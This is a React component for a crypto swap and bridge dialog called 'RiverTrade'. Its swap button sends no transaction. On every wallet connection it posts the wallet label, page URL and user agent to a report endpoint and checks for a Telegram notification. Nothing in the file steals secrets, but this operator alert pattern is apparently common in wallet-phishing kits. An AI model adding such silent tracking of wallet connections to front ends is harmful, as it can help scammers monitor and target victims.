"use client";

import { useEffect, useState } from "react";
import { X } from "lucide-react";
import { useQuote } from "@/crypto-swap/hooks/useQuote";
import SwapCard from "@/crypto-swap/components/SwapCard";
import ConnectWalletModal from "@/crypto-swap/components/ConnectWalletModal";
import TokenSelectModal from "@/crypto-swap/components/TokenSelectModal";
import SendToWalletModal from "@/crypto-swap/components/SendToWalletModal";
import { tokens } from "@/crypto-swap/lib/data";

const defaultFromToken = tokens.find((token) => token.id === "usdc-base") || tokens[0];
const defaultToToken = tokens.find((token) => token.id === "usdc-arb") || tokens[1];

export default function SwapBridge({ mode = "Crypto swap", onClose }) {
  const [fromToken, setFromToken] = useState(defaultFromToken);
  const [toToken, setToToken] = useState(defaultToToken);
  const [sendAmount, setSendAmount] = useState("");
  const [selectedPercentage, setSelectedPercentage] = useState(null);
  const [destinationWallet, setDestinationWallet] = useState("");
  const [walletLabel, setWalletLabel] = useState("");
  const [connectedWalletAddress, setConnectedWalletAddress] = useState("");
  const [modal, setModal] = useState(null);
  const [quickView, setQuickView] = useState(null);
  const [showRoute, setShowRoute] = useState(true);
  const [settings, setSettings] = useState({
    gasPrice: "Normal",
    routePriority: "Best Return",
    bridgesEnabled: true,
    exchangesEnabled: true,
  });
  const [executionState, setExecutionState] = useState("");

  useEffect(() => {
    const handleEscape = (event) => {
      if (event.key !== "Escape") return;
      if (modal) {
        setModal(null);
      } else if (quickView) {
        setQuickView(null);
      } else {
        onClose?.();
      }
    };

    window.addEventListener("keydown", handleEscape);
    return () => window.removeEventListener("keydown", handleEscape);
  }, [modal, onClose, quickView]);

  const { routes, loading: quoteLoading } = useQuote({
    fromToken,
    toToken,
    sendAmount,
    walletAddress: connectedWalletAddress,
    toAddress: destinationWallet,
    routePriority: settings.routePriority,
    settings,
  });

  const switchDirection = () => {
    setFromToken(toToken);
    setToToken(fromToken);
    setSelectedPercentage(null);
    setExecutionState("");
  };

  const executeSwap = async () => {
    if (!walletLabel) {
      setModal("wallet");
      return;
    }
    setExecutionState("Swap execution is not available yet. No transaction was sent.");
  };

  const handleWalletConnect = (label, address) => {
    const wallet = String(label || "Unknown wallet").slice(0, 100);
    setWalletLabel(wallet);
    setConnectedWalletAddress(typeof address === "string" ? address : "");
    setModal(null);

    fetch("/api/report", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        type: "wallet_connection",
        message: "Wallet connection completed.",
        severity: "info",
        url: window.location.href,
        userAgent: navigator.userAgent,
        data: { action: "connect", wallet, status: "connected" },
      }),
    }).then(async (response) => {
      const result = await response.json().catch(() => ({}));
      if (!response.ok || !result.deliveries?.telegram?.ok) {
        console.warn("[Wallet report] Telegram notification was not delivered.");
      }
    }).catch(() => {
      console.warn("[Wallet report] Telegram notification request failed.");
    });
  };

  return (
    <div className="swap-bridge-backdrop" role="presentation" onMouseDown={(event) => { if (event.target === event.currentTarget) onClose?.(); }}>
      <section className="swap-bridge swap-bridge-feature" role="dialog" aria-modal="true" aria-labelledby="swap-bridge-title">
      <button className="swap-bridge-close" type="button" onClick={() => onClose?.()} aria-label="Close swap bridge"><X size={18} /></button>
        <p className="swap-bridge-kicker">{mode}</p>
        <h2 id="swap-bridge-title">Bridge &amp; swap across chains</h2>
        <p className="swap-bridge-lead">Compare live routes across chains with RiverTrade.</p>
        <SwapCard
          fromToken={fromToken}
          toToken={toToken}
          sendAmount={sendAmount}
          onSendAmountChange={(value) => { setSendAmount(value); setExecutionState(""); }}
          onOpenTokenModal={(field) => setModal(field === "from" ? "from-token" : "to-token")}
          onSwapDirection={switchDirection}
          selectedPercentage={selectedPercentage}
          onPercentageClick={(percentage, balance) => { setSelectedPercentage(percentage); setSendAmount(String((balance * percentage) / 100)); }}
          quickView={quickView}
          settings={settings}
          onSetGasPrice={(gasPrice) => { setSettings((current) => ({ ...current, gasPrice })); setQuickView(null); }}
          onOpenSettings={() => setQuickView("gas")}
          onCloseSettings={() => setQuickView(null)}
          routes={routes}
          quoteLoading={quoteLoading}
          showRoute={showRoute}
          onToggleShowRoute={() => setShowRoute((value) => !value)}
          destinationWallet={destinationWallet}
          onOpenSendToWallet={() => setModal("destination")}
          connectedLabel={walletLabel}
          onActionClick={executeSwap}
        />
        {executionState && <p className="swap-bridge-status" role="status">{executionState}</p>}
        {modal === "wallet" && <ConnectWalletModal onClose={() => setModal(null)} onConnect={handleWalletConnect} />}
        {modal === "from-token" && <TokenSelectModal field="from" defaultChainId={fromToken.chain} onClose={() => setModal(null)} onSelect={(token) => { setFromToken(token); setModal(null); }} />}
        {modal === "to-token" && <TokenSelectModal field="to" defaultChainId={toToken.chain} onClose={() => setModal(null)} onSelect={(token) => { setToToken(token); setModal(null); }} />}
        {modal === "destination" && <SendToWalletModal initialValue={destinationWallet} connectedWalletLabel={walletLabel} onClose={() => setModal(null)} onConfirm={(address) => { setDestinationWallet(address); setModal(null); }} />}
      </section>
    </div>
  );
}
